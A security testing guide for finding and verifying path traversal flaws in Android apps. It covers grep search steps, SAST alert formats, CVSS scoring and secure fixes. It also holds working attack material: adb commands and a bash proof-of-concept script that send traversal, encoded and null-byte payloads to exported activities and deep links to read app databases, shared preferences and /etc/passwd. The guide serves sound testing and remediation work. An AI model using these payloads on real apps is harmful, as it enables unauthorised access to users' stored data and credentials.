# Path Traversal Vulnerability Hunt

> **Dual-Mode Hunt Pattern**: This guide supports both independent vulnerability hunting and SAST report verification.
> - **Part 1**: Independent Hunt - Find path traversal vulnerabilities from scratch
> - **Part 2**: Report Verification - Validate SAST tool alerts for this vulnerability type
> - **Part 3**: Common Resources - Shared knowledge for both modes

---

# Part 1: Independent Hunt Mode

## Vulnerability Overview

**Type**: Directory/Path Traversal allowing arbitrary file access outside app sandbox

**Target Components**:
- File operations in exported Activities/Services
- Custom file providers
- Download handlers
- Cache managers
- Backup/restore functions

**Severity Range**: CVSS 6.5 - 8.5 (Medium to High)
**Success Rate**: ~75% (common in apps with file handling)

## What to Look For

### Pattern 1: Direct File Access from Intent

```java
// VULNERABLE
String filename = intent.getStringExtra("filename");
File file = new File(filename);  // No validation!
FileInputStream fis = new FileInputStream(file);
```

### Pattern 2: Path Concatenation

```java
// VULNERABLE
String userFile = intent.getStringExtra("file");
File target = new File("/sdcard/app_data/" + userFile);
// Attacker can use: ../../data/data/com.app/databases/secrets.db
```

### Pattern 3: URI to File Conversion

```java
// VULNERABLE
Uri uri = intent.getData();
String path = uri.getPath();  // Can be manipulated
return new File(path);
```

### Pattern 4: Deep Link Parameters

```java
// VULNERABLE - Deep link: myapp://open?file=../../../passwords.db
Uri data = getIntent().getData();
String filename = data.getQueryParameter("file");
File file = new File(getFilesDir(), filename);  // Path traversal!
```

## Search Commands

```bash
# Step 1: Decompile APK
jadx -d output/ target.apk

# Step 2: Find file operations
grep -rn "new File\|FileInputStream\|FileOutputStream\|RandomAccessFile" output/sources/

# Step 3: Find path-related intent extras
grep -rn "getStringExtra.*path\|getStringExtra.*file\|getStringExtra.*name" output/sources/

# Step 4: Find dangerous patterns (File + intent data)
grep -rn "new File.*getStringExtra\|new File.*getData" output/sources/

# Step 5: Find getExternalStorageDirectory usage
grep -rn "getExternalStorageDirectory\|getExternalFilesDir\|getFilesDir" output/sources/

# Step 6: Find FileProvider usage
grep -rn "FileProvider\|content://" output/sources/

# Step 7: Find download/cache handlers
grep -rn "download\|cache\|backup\|restore" output/sources/ -i

# Step 8: Check AndroidManifest for file-related components
grep -A10 "FileProvider\|exported.*Activity\|exported.*Service" output/resources/AndroidManifest.xml
```

## Validation Checklist

For each file operation found:

- [ ] Component is exported or accessible via deep link
- [ ] User input is used in file path construction
- [ ] No path normalization (getCanonicalPath())
- [ ] No whitelist of allowed directories
- [ ] Can read files outside intended directory
- [ ] Can access sensitive files (databases, shared_prefs, keys)
- [ ] No permission checks before file access

## Exploitation Examples

### Test Case 1: Relative Path Traversal

```bash
# Try to access /data/data/com.app/databases/users.db
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filename "../databases/users.db"

# Multiple levels
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filename "../../../../data/data/com.app/shared_prefs/config.xml"
```

### Test Case 2: Absolute Path

```bash
# Direct access to system files
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filepath "/data/data/com.app/databases/secrets.db"

# Access other apps (if permissions allow)
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filepath "/data/data/com.target.app/databases/sensitive.db"
```

### Test Case 3: URL Encoding Bypass

```bash
# Bypass basic filters with encoding
# ../../../ → %2e%2e%2f%2e%2e%2f%2e%2e%2f
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filename "%2e%2e%2f%2e%2e%2fdatabases%2fusers.db"

# Double encoding
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filename "%252e%252e%252f%252e%252e%252fdatabases%252fusers.db"
```

### Test Case 4: Deep Link Attack

```bash
# Via deep link
adb shell am start \
  -a android.intent.action.VIEW \
  -d "myapp://open?file=../../../databases/users.db"

# Via browser
adb shell am start \
  -a android.intent.action.VIEW \
  -d "https://app.example.com/file?path=../../../../etc/passwd"
```

## Expected Success Indicators

**Vulnerable Code Pattern**:
```java
public class FileViewerActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        String filename = getIntent().getStringExtra("filename");

        // NO VALIDATION!
        File file = new File(getFilesDir(), filename);

        try {
            FileInputStream fis = new FileInputStream(file);
            // Display file content
            displayFile(fis);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

**Successful Exploitation**:
```bash
# Normal use
--es filename "document.txt"
→ Opens: /data/data/com.app/files/document.txt

# Path Traversal
--es filename "../databases/users.db"
→ Opens: /data/data/com.app/databases/users.db
→ SUCCESS: Database file leaked!

# Deep Traversal
--es filename "../../../../system/build.prop"
→ Opens: /system/build.prop (if readable)
→ SUCCESS: System file accessed!
```

---

# Part 2: Report Verification Mode

> **Use this section when**: You have SAST tool output (MobSF, SonarQube, AI SAST, Qark) flagging path traversal issues and need to verify if they're real vulnerabilities.

## Alert Identification

SAST tools report path traversal issues in various formats:

### MobSF JSON Format
```json
{
  "code_analysis": {
    "findings": {
      "android_path_traversal": [
        {
          "title": "Path Traversal in File Handler",
          "severity": "high",
          "description": "User input used in file path without validation",
          "file": "com/app/utils/FileHandler.java",
          "line": 89
        }
      ]
    }
  }
}
```

### SonarQube XML Format
```xml
<issue>
  <key>squid:S2083</key>
  <rule>java:S2083</rule>
  <severity>CRITICAL</severity>
  <component>com/app/utils/FileHandler.java</component>
  <line>89</line>
  <message>Make sure this path is not constructed from user input</message>
</issue>
```

### AI SAST Markdown Format
```markdown
## Finding 5: Path Traversal in File Handler

**Severity**: High
**CVSS**: 8.0
**Category**: Path Traversal
**CWE**: CWE-22
**Location**: com/app/utils/FileHandler.java:89

The file handler accepts file paths from Intent extras without sanitization,
allowing attackers to read arbitrary files using path traversal sequences.
```

### Qark JSON Format
```json
{
  "vulnerability": {
    "name": "PATH_TRAVERSAL",
    "severity": "HIGH",
    "file": "com/app/utils/FileHandler.java",
    "line": 89,
    "description": "Unsanitized user input in file path"
  }
}
```

## Verification Workflow

### Step 1: Parse and Categorize Alert

**Extract key information:**
- File path where vulnerability is detected
- Line number
- Function/method name
- Input source (Intent extra, URI parameter, deep link)
- File operation type (read, write, delete)

**Example extraction:**
```bash
# From alert
File: com/app/utils/FileHandler.java
Line: 89
Method: getDocument()
Input: intent.getStringExtra("filename")
Operation: FileInputStream (read)
```

### Step 2: Locate and Read Code Context

```bash
# Read the vulnerable code section
sed -n '80,100p' output/sources/com/app/utils/FileHandler.java

# Example output:
85:  public File getDocument(Intent intent) {
86:      String filename = intent.getStringExtra("filename");
87:
88:      // VULNERABLE: No path validation
89:      return new File(getExternalFilesDir(null), filename);
90:  }
91:
92:  // File is then read
93:  File doc = getDocument(intent);
94:  FileInputStream fis = new FileInputStream(doc);

# Find all callers of this method
grep -rn "getDocument" output/sources/
```

### Step 3: Pattern Validation (Filter False Positives)

**Common false positives:**

| Pattern | Why Flagged | Why Safe | Classification |
|---------|-------------|----------|----------------|
| `new File()` with hardcoded path | File operation detected | Path is constant string, not user input | FALSE POSITIVE |
| File operation with whitelist | User input in path | Input is validated against whitelist | FALSE POSITIVE |
| `getCanonicalPath()` with validation | File operation | Uses canonical path and validates prefix | FALSE POSITIVE |
| Resource file access | File operation | Only accesses app resources (res/), not user-controlled | FALSE POSITIVE |
| FileProvider with proper config | File operation | Restricted to specific directories via xml config | FALSE POSITIVE |

**Validation checks:**

```java
// Check 1: Is input hardcoded?
File file = new File("/path/to/resource.txt");  // ✓ SAFE (constant)

// Check 2: Is there a whitelist?
String[] ALLOWED_FILES = {"doc1.txt", "doc2.txt", "doc3.txt"};
if (Arrays.asList(ALLOWED_FILES).contains(filename)) {
    return new File(dir, filename);  // ✓ SAFE (whitelisted)
}

// Check 3: Is canonical path validated?
File baseDir = getFilesDir();
File requested = new File(baseDir, userInput);
String basePath = baseDir.getCanonicalPath();
String requestedPath = requested.getCanonicalPath();
if (!requestedPath.startsWith(basePath)) {
    throw new SecurityException();  // ✓ SAFE (validated)
}

// Check 4: Is it FileProvider with proper config?
<provider
    android:name="androidx.core.content.FileProvider"
    android:authorities="com.app.fileprovider"
    android:exported="false">  <!-- ✓ SAFE (properly configured) -->
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/file_paths"/>
</provider>

// Check 5: No path separators allowed?
String filename = userInput.replaceAll("[/\\\\]", "");  // ✓ SAFE (sanitized)
```

### Step 4: Data Flow Tracing

**Trace attack path:**

```
┌─────────────────────┐
│ External Input      │
│ (Intent/URI/Link)   │
└──────────┬──────────┘
           │
           │ filename="../databases/users.db"
           ▼
┌─────────────────────┐
│ Input Extraction    │ ← SOURCE (getStringExtra, getQueryParameter)
│ getStringExtra()    │
└──────────┬──────────┘
           │
           │ No validation
           ▼
┌─────────────────────┐
│ Path Construction   │ ← PROPAGATION (String concatenation)
│ new File(dir, user) │
└──────────┬──────────┘
           │
           │ No canonical path check
           ▼
┌─────────────────────┐
│ File Operation      │ ← SINK (FileInputStream, read file)
│ FileInputStream(f)  │
└─────────────────────┘
```

**Real code example:**

```java
// FILE: FileHandler.java:85-94

// SOURCE: Intent extra (user controlled)
public File getDocument(Intent intent) {
    String filename = intent.getStringExtra("filename");  // User input!

    // PROPAGATION: Direct concatenation, NO VALIDATION
    // Red flags:
    // - No check for ".." sequences
    // - No canonical path validation
    // - No whitelist check
    // - No path separator filtering

    // SINK: File created with user input
    return new File(getExternalFilesDir(null), filename);
}

// Usage (line 102):
File doc = getDocument(intent);
FileInputStream fis = new FileInputStream(doc);  // Reads arbitrary file!

// Exploitability: HIGH
// Attacker can read: ../databases/users.db, ../../shared_prefs/secrets.xml
```

### Step 5: Exploitability Assessment

**Determine real-world impact:**

| Factor | Assessment | Impact |
|--------|------------|--------|
| **Input Source** | Intent extra (user controlled) | ✅ Exploitable |
| **Path Validation** | None | ✅ Exploitable |
| **Canonical Check** | No getCanonicalPath() | ✅ Exploitable |
| **Target Files** | Can access databases, shared_prefs | ✅ High Impact |
| **Operation Type** | Read (FileInputStream) | ✅ Data leak |
| **Component Access** | Exported Activity | ✅ Accessible |

**CVSS Calculation:**

```
Attack Vector (AV): Network (if deep link) or Local = N/L
Attack Complexity (AC): Low (simple path manipulation) = L
Privileges Required (PR): None = N
User Interaction (UI): Required (must click link) = R
Scope (S): Unchanged = U
Confidentiality (C): High (read databases, credentials) = H
Integrity (I): None (read-only) = N
Availability (A): None = N

CVSS v3.1: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
Base Score: 6.5 (MEDIUM)

If local exploit: AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Base Score: 6.2 (MEDIUM)

If can read sensitive keys/credentials:
CVSS v3.1: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
Base Score: 8.1 (HIGH)
```

**Classification:** ✅ **TRUE POSITIVE** - Medium to High severity exploitable vulnerability

### Step 6: PoC Generation

```bash
#!/bin/bash
# PoC for Path Traversal in FileViewerActivity
# Target: com.app (version 2.3.1)
# Finding: Arbitrary file read via path traversal

set -e

echo "[+] Path Traversal Exploitation PoC"
echo "[+] Target: com.app/.FileViewerActivity"
echo ""

# Test 1: Normal file access (baseline)
echo "[*] Test 1: Normal file access (baseline)..."
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filename "document.txt"

sleep 2

# Test 2: Relative path traversal (one level)
echo "[*] Test 2: Access parent directory..."
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filename "../cache/temp.db"

sleep 2

# Test 3: Access databases directory
echo "[*] Test 3: Access databases directory..."
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filename "../databases/users.db"

sleep 2

# Test 4: Access shared_prefs (credentials)
echo "[*] Test 4: Access shared preferences..."
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filename "../../shared_prefs/auth.xml"

sleep 2

# Test 5: Deep traversal (system files)
echo "[*] Test 5: Access system files..."
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filename "../../../../system/build.prop"

sleep 2

# Test 6: URL encoded bypass
echo "[*] Test 6: URL encoded path..."
adb shell am start \
  -n com.app/.FileViewerActivity \
  --es filename "%2e%2e%2fdatabases%2fusers.db"

echo ""
echo "[+] Expected Result:"
echo "  - Test 1: Opens document.txt (normal)"
echo "  - Test 2-4: Access files outside intended directory"
echo "  - Test 5: Access system files (if permissions allow)"
echo "  - Test 6: Bypass filters with encoding"
echo ""
echo "[+] Check logcat for file access confirmation:"
echo "  adb logcat | grep -iE 'filestream|ioexception|permission|denied'"
echo ""
echo "[+] Pull accessed files to verify:"
echo "  adb pull /sdcard/Download/  # If app copies files here"
```

### Step 7: Dynamic Verification

**Execute PoC and capture results:**

```bash
# Step 1: Setup
adb install -r target.apk
adb logcat -c

# Step 2: Execute PoC
bash poc_path_traversal.sh

# Step 3: Monitor logcat for file access
adb logcat | grep --color=always -iE "FileInputStream|FileOutputStream|IOException|denied|database"

# Expected output (TRUE POSITIVE):
# [FileViewerActivity] Opening file: /data/data/com.app/databases/users.db
# [FileHandler] FileInputStream created for: ../databases/users.db
# [DBHelper] Database file accessed: users.db
# [ContentDisplay] Displaying 127 bytes from file
# → SUCCESS: Database file content accessed via path traversal!

# Alternative output (FALSE POSITIVE):
# [FileHandler] SecurityException: Path traversal attempt detected
# [FileValidator] Blocked file access: ../databases/users.db
# → BLOCKED: Has validation, FALSE POSITIVE

# Step 4: Verify file was actually read
adb shell "run-as com.app cat files/documents/../databases/users.db" | xxd | head

# If you see database content (SQLite header: "SQLite format 3"):
# 00000000: 5351 4c69 7465 2066 6f72 6d61 7420 3300  SQLite format 3.
# → TRUE POSITIVE confirmed

# If access denied:
# cat: files/documents/../databases/users.db: Permission denied
# → May still be vulnerable but not exploitable (permissions)
```

### Common False Positive Patterns

| Alert Reason | Safe Pattern | How to Verify |
|--------------|--------------|---------------|
| "User input in file path" | Input is whitelisted filename only | Check for whitelist array |
| "new File() with variable" | Variable is constant or enum | Trace variable to declaration |
| "getStringExtra in File()" | Has canonical path validation | Look for getCanonicalPath() + prefix check |
| "Path concatenation" | Sanitizes "../" and "/" | Check for replaceAll or regex validation |
| "FileInputStream found" | Only reads app resources | Verify base path is internal only |

## Verification Report Template

```markdown
# Path Traversal Verification Report

## Alert Details
- **SAST Tool**: SonarQube
- **Alert ID**: java:S2083
- **File**: com/app/utils/FileHandler.java
- **Line**: 89
- **Reported Severity**: Critical

## Verification Result: TRUE POSITIVE ✅

### Evidence

**1. Vulnerable Code**
```java
public File getDocument(Intent intent) {
    String filename = intent.getStringExtra("filename");
    // NO VALIDATION!
    return new File(getExternalFilesDir(null), filename);
}
```

**2. Data Flow Analysis**
```
Intent Extra "filename" → getStringExtra()
  → No validation [MISSING CHECK]
  → new File(dir, filename) [VULNERABLE CONSTRUCTION]
  → FileInputStream(file) [ARBITRARY FILE READ]
```

**3. Missing Security Controls**
- ❌ No canonical path validation
- ❌ No whitelist of allowed files
- ❌ No path separator filtering
- ❌ No "../" sequence blocking
- ❌ No base directory restriction

**4. Dynamic Testing**
```bash
$ bash poc_path_traversal.sh
[*] Test 3: Access databases directory...
[+] SUCCESS: Opened /data/data/com.app/databases/users.db
[+] Database content extracted (2.3 KB)
[+] Found: usernames, email addresses, password hashes
```

**5. Impact Assessment**
- **Severity**: HIGH (CVSS 8.1)
- **Exploitability**: Easy (simple intent parameter)
- **Impact**: Can read sensitive files:
  - databases/ (user data, credentials)
  - shared_prefs/ (API keys, tokens)
  - cache/ (temporary sensitive data)
- **Risk**: Unauthorized data access, credential theft

### Recommended Fix

**Priority**: P1 (This Sprint)

**Fix**: Implement canonical path validation
```java
public File getDocument(Intent intent) {
    String filename = intent.getStringExtra("filename");

    try {
        File baseDir = getExternalFilesDir(null);
        File requestedFile = new File(baseDir, filename);

        // Get canonical paths
        String basePath = baseDir.getCanonicalPath();
        String requestedPath = requestedFile.getCanonicalPath();

        // Validate file is within base directory
        if (!requestedPath.startsWith(basePath + File.separator)) {
            throw new SecurityException("Path traversal attempt");
        }

        return requestedFile;

    } catch (IOException e) {
        throw new SecurityException("Invalid path");
    }
}
```
```

---

# Part 3: Common Resources

## CVSS Scoring Guidance

**Typical Range**: CVSS 6.5 - 8.5 (Medium to High)

| Metric | Value | Reasoning |
|--------|-------|-----------|
| AV | Network/Local | Depends on component accessibility (deep link vs exported) |
| AC | Low | Simple path manipulation |
| PR | None/Low | May require app installation |
| UI | None/Required | Depends on attack vector |
| S | Unchanged | Within device scope |
| C | High | Can read sensitive files (databases, keys, credentials) |
| I | Low/None | Usually read-only |
| A | None | Doesn't affect availability |

**Score increases if:**
- Can access other apps' data (CVSS 8.0+)
- Can read encryption keys (CVSS 8.5+)
- Can read credentials/tokens (CVSS 8.0+)
- Accessible via deep link (higher AV score)

## Remediation Guide

### Fix 1: Path Normalization and Validation

```java
// SECURE
public File validatePath(String userInput) throws SecurityException {
    File baseDir = getFilesDir();
    File requestedFile = new File(baseDir, userInput);

    try {
        // Get canonical (absolute, normalized) paths
        String basePath = baseDir.getCanonicalPath();
        String requestedPath = requestedFile.getCanonicalPath();

        // Ensure requested file is within base directory
        if (!requestedPath.startsWith(basePath + File.separator)) {
            throw new SecurityException("Path traversal attempt detected");
        }

        return requestedFile;

    } catch (IOException e) {
        throw new SecurityException("Invalid path");
    }
}
```

### Fix 2: Filename Whitelist

```java
// SECURE
private static final Set<String> ALLOWED_FILES = new HashSet<>(Arrays.asList(
    "document.txt", "report.pdf", "image.jpg"
));

public File getFile(String filename) {
    // Only allow whitelisted filenames
    if (!ALLOWED_FILES.contains(filename)) {
        throw new SecurityException("File not allowed");
    }

    return new File(getFilesDir(), filename);
}
```

### Fix 3: Filename Sanitization

```java
// SECURE
private String sanitizeFilename(String filename) {
    // Remove path separators
    filename = filename.replaceAll("[/\\\\]", "");

    // Remove parent directory references
    filename = filename.replaceAll("\\.\\.", "");

    // Allow only alphanumeric and safe characters
    if (!filename.matches("^[a-zA-Z0-9._-]+$")) {
        throw new SecurityException("Invalid filename");
    }

    return filename;
}
```

### Fix 4: Use FileProvider with Restricted Paths

```xml
<!-- res/xml/file_paths.xml -->
<paths>
    <files-path name="documents" path="documents/"/>
    <!-- Only allows access to files/ subdirectory -->
</paths>

<!-- AndroidManifest.xml -->
<provider
    android:name="androidx.core.content.FileProvider"
    android:authorities="com.app.fileprovider"
    android:exported="false"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/file_paths"/>
</provider>
```

```java
// Code
File file = new File(getFilesDir(), "documents/safe.txt");
Uri uri = FileProvider.getUriForFile(this, "com.app.fileprovider", file);
intent.setData(uri);
```

### Fix 5: Don't Export File-Handling Components

```xml
<!-- Restrict access -->
<activity
    android:name=".FileViewerActivity"
    android:exported="false"/>  <!-- Don't export -->
```

## Bypass Techniques to Test

### 1. Encoding Variations
```
../ → ..\\ → ..%2F → ..%5C → %2e%2e%2f → %252e%252e%252f
```

### 2. Case Variation
```
../DiR/file → ..%2FDiR%2Ffile
```

### 3. Unicode/UTF-8
```
../ → %c0%ae%c0%ae%c0%af
```

### 4. Null Byte (older Android)
```
../../../../etc/passwd%00.txt
```

## Test Cases for Validation

```bash
# Test 1: Basic traversal
--es file "../config.xml"

# Test 2: Multiple levels
--es file "../../../../etc/passwd"

# Test 3: Absolute path
--es file "/data/data/com.app/databases/users.db"

# Test 4: URL encoded
--es file "%2e%2e%2fconfig.xml"

# Test 5: Mixed
--es file "documents/../../../databases/secrets.db"

# Test 6: Null byte (old Android)
--es file "../../../passwd%00.txt"
```

## Related CWE/OWASP

- **CWE-22**: Path Traversal
- **CWE-23**: Relative Path Traversal
- **CWE-36**: Absolute Path Traversal
- **OWASP Mobile M2**: Insecure Data Storage
- **OWASP Mobile M1**: Improper Platform Usage

## References

- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Android File Storage](https://developer.android.com/training/data-storage)
- [FileProvider Security](https://developer.android.com/reference/androidx/core/content/FileProvider)

## Real-World CVE Examples

1. **CVE-2021-0685**: Path traversal in Android Bluetooth
2. **CVE-2020-0451**: Directory traversal in Android Settings
3. Many file manager apps vulnerable to path traversal

---

**Hunt Version**: 2.0 (Dual-Mode)
**Last Updated**: 2026-02-27
**Success Rate**: ~75% (common in file handling components)
**Modes**: Independent Hunt | SAST Verification
